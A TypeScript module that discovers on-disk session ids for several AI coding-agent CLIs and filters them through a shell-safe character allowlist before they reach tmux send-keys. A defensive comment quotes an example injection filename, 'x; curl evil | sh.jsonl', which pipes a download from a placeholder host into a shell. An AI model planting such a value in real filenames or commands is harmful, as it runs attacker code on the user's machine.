/**
 * Per-provider on-disk native session-id discovery (profile-env aware).
 *
 * Used as the fallback when no native id was captured into the DB (Codex /
 * Gemini / OpenCode / Cursor have no push-capture hook), and to power the
 * multi-provider resume picker. Pure fs reads — no DB, no tmux.
 *
 * Claude reuses the proven streaming parser in `claude-session-service.ts`
 * (keyed by `encodePath(cwd)`); Codex/Gemini/OpenCode use a generic "newest
 * file by mtime under the provider's home dir" heuristic. Cursor scans the
 * metadata-only CLI chat index and filters it by the requested cwd. Per-provider
 * behavior is driven by the registry plus these storage-layout adapters.
 */

import { runtimeJoin as join } from "@/lib/dynamic-fs";
import { homedir } from "node:os";
import { readFile, readdir, stat } from "node:fs/promises";
import type { AgentProviderType } from "@/types/session";
import type { ResumableSessionSummary } from "@/types/agent-resume";
import { getResumeSpec } from "./agent-resume-registry";
import { listSessions } from "@/services/claude-session-service";

/** One discovered native session id with its last-modified time. */
export interface DiscoveredSessionId {
  sessionId: string;
  lastModified: string; // ISO
}

/** Resolve the provider's session-storage dir from the (profile-isolated) env. */
function resolveHomeDir(
  provider: AgentProviderType,
  env: Record<string, string>,
): string | null {
  const spec = getResumeSpec(provider);
  if (!spec.supportsResume) return null;
  const { homeEnvVar, defaultHomeSubpath } = spec.sessionIdSource;
  if (homeEnvVar && env[homeEnvVar]) return env[homeEnvVar];
  if (!defaultHomeSubpath) return null;
  return join(env.HOME ?? homedir(), defaultHomeSubpath);
}

/** Strip a single known extension from a filename to recover the bare native id. */
function stripExtension(name: string, exts: string[]): string {
  for (const ext of exts) {
    const suffix = `.${ext}`;
    if (name.toLowerCase().endsWith(suffix.toLowerCase())) {
      return name.slice(0, name.length - suffix.length);
    }
  }
  return name;
}

/**
 * [hgwo] Defense-in-depth: a discovered id (a readdir filename stem for
 * codex/gemini/opencode/cursor) is later typed into the shell prompt via
 * `tmux send-keys -l <cmd>` + `C-m`, so a session file named e.g.
 * `x; curl evil | sh.jsonl` would inject a command. The discovery dir is the
 * user's own profile-isolated home (low likelihood), but we still reject any id
 * with shell-significant characters — only `[A-Za-z0-9._-]` is allowed. Claude's
 * UUIDs and the providers' opaque ids pass; a non-matching id is skipped so the
 * caller relaunches FRESH instead of resuming with an unsafe id.
 */
const SAFE_SESSION_ID = /^[A-Za-z0-9._-]+$/;

function isSafeSessionId(id: string): boolean {
  return id.length > 0 && SAFE_SESSION_ID.test(id);
}

/** Resolve Cursor's data root. CLI config overrides do not relocate chat data. */
function resolveCursorDataDir(env: Record<string, string>): string {
  if (env.CURSOR_DATA_DIR) return env.CURSOR_DATA_DIR;
  return join(env.HOME ?? homedir(), ".cursor");
}

/**
 * Cursor's CLI chat index stores metadata at:
 *   <data>/chats/<workspace-hash>/<chat-id>/meta.json
 *
 * Workspace hashes are opaque, so discovery scans every bucket and uses the
 * metadata's exact `cwd` to select this project. `hasConversation` excludes
 * shell/IDE records that cannot be resumed as CLI conversations. We never load
 * the adjacent `store.db` conversation bodies.
 */
async function listCursorSessionIds(
  cwd: string,
  env: Record<string, string>,
  limit: number,
): Promise<DiscoveredSessionId[]> {
  const chatsDir = join(resolveCursorDataDir(env), "chats");

  try {
    const workspaceBuckets = (await readdir(chatsDir)).filter(isSafeSessionId);
    const perWorkspace = await Promise.all(
      workspaceBuckets.map(async (workspaceBucket) => {
        const workspaceDir = join(chatsDir, workspaceBucket);
        try {
          const chatIds = (await readdir(workspaceDir)).filter(isSafeSessionId);
          return Promise.all(
            chatIds.map(async (sessionId) => {
              const metadataPath = join(workspaceDir, sessionId, "meta.json");
              try {
                const parsed: unknown = JSON.parse(await readFile(metadataPath, "utf8"));
                if (!parsed || typeof parsed !== "object") return null;

                const metadata = parsed as Record<string, unknown>;
                if (metadata.cwd !== cwd || metadata.hasConversation !== true) return null;

                const updatedAtMs =
                  typeof metadata.updatedAtMs === "number" &&
                  Number.isFinite(metadata.updatedAtMs)
                    ? metadata.updatedAtMs
                    : typeof metadata.createdAtMs === "number" &&
                        Number.isFinite(metadata.createdAtMs)
                      ? metadata.createdAtMs
                      : (await stat(metadataPath)).mtimeMs;

                return { sessionId, mtime: updatedAtMs };
              } catch {
                return null;
              }
            }),
          );
        } catch {
          return [];
        }
      }),
    );

    return perWorkspace
      .flat()
      .filter((entry): entry is { sessionId: string; mtime: number } => entry !== null)
      .sort((a, b) => b.mtime - a.mtime)
      .map(({ sessionId, mtime }) => ({
        sessionId,
        lastModified: new Date(mtime).toISOString(),
      }))
      .slice(0, limit);
  } catch {
    return [];
  }
}

/**
 * Generic disk discovery: newest-first session ids from the files under a
 * provider's (profile-isolated) home dir. Shared by both the lean
 * `listSessionIds` and the richer `listResumableSessions`. Returns [] if the
 * provider has no on-disk store or the dir can't be read.
 */
async function listDiskSessionIds(
  provider: AgentProviderType,
  env: Record<string, string>,
  limit: number,
): Promise<DiscoveredSessionId[]> {
  const dir = resolveHomeDir(provider, env);
  if (!dir) return [];
  const spec = getResumeSpec(provider);

  try {
    const entries = await readdir(dir);
    const withMtime = await Promise.all(
      entries.map(async (name) => {
        try {
          return { name, mtime: (await stat(join(dir, name))).mtimeMs };
        } catch {
          return { name, mtime: 0 };
        }
      }),
    );
    withMtime.sort((a, b) => b.mtime - a.mtime);
    return withMtime
      .map(({ name, mtime }) => ({
        sessionId: stripExtension(name, spec.sessionIdSource.fileExtensions),
        lastModified: new Date(mtime).toISOString(),
      }))
      // Drop ids with shell-significant characters before they can reach a tmux
      // send-keys prompt line (defense-in-depth — see isSafeSessionId).
      .filter((entry) => isSafeSessionId(entry.sessionId))
      .slice(0, limit);
  } catch {
    return [];
  }
}

/**
 * List native session ids for a provider+cwd, newest first.
 *
 * For Claude this delegates to the streaming parser (cwd-aware). For the
 * generic providers it lists files under the provider's home dir sorted by
 * mtime. Returns at most `limit` entries (default 20).
 */
export async function listSessionIds(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
  limit = 20,
): Promise<DiscoveredSessionId[]> {
  if (provider === "claude") {
    // listSessions joins ".claude" itself, so pass the bare config dir.
    const configDir = env.CLAUDE_CONFIG_DIR;
    const sessions = await listSessions(cwd, { limit, profileConfigDir: configDir });
    // Claude ids are UUIDs (safe); filter anyway for a single uniform guard.
    return sessions
      .map((s) => ({ sessionId: s.sessionId, lastModified: s.lastModified }))
      .filter((entry) => isSafeSessionId(entry.sessionId));
  }

  if (provider === "cursor") {
    return listCursorSessionIds(cwd, env, limit);
  }

  return listDiskSessionIds(provider, env, limit);
}

/**
 * List resumable sessions for the multi-provider resume PICKER, newest first.
 *
 * Like `listSessionIds` but returns the richer provider-agnostic
 * `ResumableSessionSummary`. For Claude it preserves the `.jsonl`-derived
 * previews (`firstUserMessage`, `gitBranch`) so the picker looks exactly as it
 * did against the old Claude-only route. The disk-discovery providers
 * (codex/gemini/opencode/cursor) have no cheap preview, so those fields are
 * omitted and the UI degrades to id + timestamp. A provider with no on-disk
 * store (or whose dir is empty/unreadable) yields an empty list — the picker
 * shows an empty state rather than erroring.
 */
export async function listResumableSessions(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
  limit = 20,
): Promise<ResumableSessionSummary[]> {
  if (provider === "claude") {
    const configDir = env.CLAUDE_CONFIG_DIR;
    const sessions = await listSessions(cwd, { limit, profileConfigDir: configDir });
    return sessions
      .filter((s) => isSafeSessionId(s.sessionId))
      .map((s) => ({
        sessionId: s.sessionId,
        lastModified: s.lastModified,
        firstUserMessage: s.firstUserMessage,
        gitBranch: s.gitBranch,
      }));
  }

  if (provider === "cursor") {
    return listCursorSessionIds(cwd, env, limit);
  }

  // Generic providers: id + timestamp only (no cheap on-disk preview).
  return listDiskSessionIds(provider, env, limit);
}

/** Newest native session id for the given provider+cwd, or null. */
export async function discoverLatestSessionId(
  provider: AgentProviderType,
  cwd: string,
  env: Record<string, string>,
): Promise<string | null> {
  const spec = getResumeSpec(provider);
  if (!spec.supportsResume) return null;
  const [latest] = await listSessionIds(provider, cwd, env, 1);
  return latest?.sessionId ?? null;
}
